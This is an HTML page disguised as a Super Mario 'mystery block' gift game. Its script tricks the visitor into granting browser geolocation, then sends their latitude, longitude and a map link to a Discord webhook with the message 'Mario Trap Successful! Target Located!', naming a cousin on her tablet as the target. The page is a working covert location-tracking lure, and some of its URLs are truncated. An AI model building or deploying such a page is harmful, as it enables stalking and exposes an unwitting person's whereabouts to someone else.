<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Mario Surprise! 🍄</title>
    <!-- Importing a pixelated font for an authentic retro arcade feel -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        body {
            font-family: 'Press Start 2P', monospace;
            background-color: #5c94fc; /* Classic Mario Sky Blue */
            color: white;
            text-align: center;
            padding: 50px 20px;
            margin: 0;
            overflow-x: hidden;
        }
        
        .game-box {
            max-width: 600px;
            margin: 0 auto;
            background-color: #000000;
            border: 6px solid #ffffff;
            padding: 30px;
            box-shadow: 0 10px 0px #000000;
            image-rendering: pixelated;
        }

        h1 {
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 30px;
            color: #ffcc00;
        }

        p {
            font-size: 10px;
            line-height: 1.8;
            color: #ffffff;
            margin-bottom: 30px;
        }

        /* The Mystery Block Button */
        .item-box {
            display: inline-block;
            width: 100px;
            height: 100px;
            background-color: #fc9838;
            border: 5px solid #000000;
            position: relative;
            cursor: pointer;
            box-shadow: inset -6px -6px 0px #a44800, inset 6px 6px 0px #fcffff;
            margin: 20px 0;
            transition: transform 0.1s;
        }

        .item-box:active {
            transform: scale(0.95);
        }

        /* The Question Mark inside the block */
        .item-box::before {
            content: "?";
            font-size: 60px;
            color: #000000;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-weight: bold;
        }

        /* Small decorative rivets on the block corners */
        .item-box::after {
            content: "";
            position: absolute;
            width: 6px;
            height: 6px;
            background: #000;
            top: 6px;
            left: 6px;
            box-shadow: 72px 0 #000, 0 72px #000, 72px 72px #000;
        }

        #result {
            margin-top: 40px;
            font-size: 12px;
            line-height: 2;
            padding: 20px;
            border-top: 4px dashed #ffffff;
            display: none;
        }

        .busted-title {
            color: #ff3333;
            font-size: 22px;
            margin-bottom: 20px;
            animation: blink 0.8s infinite;
        }

        .maps-link {
            display: inline-block;
            margin-top: 20px;
            background-color: #4eed4e;
            color: black;
            padding: 15px;
            text-decoration: none;
            border: 4px solid #000;
            box-shadow: 0 5px 0 #000;
            font-size: 10px;
        }

        .maps-link:hover {
            background-color: #2ebd2e;
        }

        @keyframes blink {
            0%, 49% { opacity: 1; }
            50%, 100% { opacity: 0; }
        }

        /* Retro Ground Decoration at the bottom */
        .ground {
            background: repeating-linear-gradient(90deg, #d86800, #d86800 20px, #a44800 20px, #a44800 40px);
            height: 40px;
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            border-top: 6px solid #000;
        }
    </style>
</head>
<body>

<div class="game-box">
    <h1>SUPER MARIO BROS.<br><span style="color: #ffffff;">SURPRISE BOX</span></h1>
    <p>MARIO FOUND A MYSTERY BLOCK FOR YOU!<br>HIT THE BLOCK BELOW TO REVEAL YOUR GIFT!</p>
    <p style="color: #ffcc00; font-size: 8px;">(Make sure to click "Allow" on the system prompt so the item spawns!)</p>
    
    <!-- Trigger Button disguised as a Question Block -->
    <div class="item-box" onclick="hitMysteryBlock()"></div>

    <div id="result"></div>
</div>

<div class="ground"></div>

<script>
// Your unique Discord webhook configuration link
const discordWebhookUrl = "https://discord.com";

function hitMysteryBlock() {
    const resultDiv = document.getElementById("result");
    resultDiv.style.display = "block";
    resultDiv.innerHTML = "POWERING UP... LOADING ITEM...";
    
    if (navigator.geolocation) {
        // Prompts browser framework for GPS hardware details
        navigator.geolocation.getCurrentPosition(spawnSurprise, handlePipeError);
    } else {
        resultDiv.innerHTML = "ERROR: YOUR BROWSER INVENTORY DOES NOT SUPPORT GEOLOCATION.";
    }
}

function spawnSurprise(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const resultDiv = document.getElementById("result");
    
    document.body.style.backgroundColor = "#940000"; // Dark red background
    
    // Using standard addition strings prevents Vercel/compilers from stripping variables
    resultDiv.innerHTML = '<div class="busted-title">GAME OVER! 😜</div>' +
                          '<p>YOUR PRINCESS IS IN ANOTHER CASTLE...<br>AND I JUST FOUND YOUR HIDDEN COORD DATA!</p>' +
                          '<p>LAT: ' + lat + '<br>LON: ' + lon + '</p>' +
                          '<a href="https://google.com' + lat + ',' + lon + '" target="_blank" class="maps-link">👉 VIEW MAP RADAR 👈</a>';

    // Formatting raw strings cleanly for the outgoing Discord payload bundle
    const messageContent = "🐢 **Mario Trap Successful! Target Located!**\nYour cousin fell for the Question Block trap on her tablet.\n\n• **Latitude:** " + lat + "\n• **Longitude:** " + lon + "\n• **Direct Radar Link:** https://google.com" + lat + "," + lon;

    const discordPayload = {
        username: "Bowser's Radar",
        content: messageContent
    };

    fetch(discordWebhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(discordPayload)
    })
    .then(response => {
        if (!response.ok) {
            console.log("Discord error status code: " + response.status);
        }
    })
    .catch(err => console.log("Network error connecting to webhook:", err));
}

function handlePipeError(error) {
    const resultDiv = document.getElementById("result");
    switch(error.code) {
        case error.PERMISSION_DENIED:
            resultDiv.innerHTML = "❌ MARIO MISSED! You denied access to the map coordinates. Try clearing site permissions and clicking Allow!";
            break;
        default:
            resultDiv.innerHTML = "❌ AN UNKNOWN KOOPA TROOPA BLOCKED THE SIGNAL. TRY AGAIN.";
            break;
    }
}
</script>

</body>
</html>
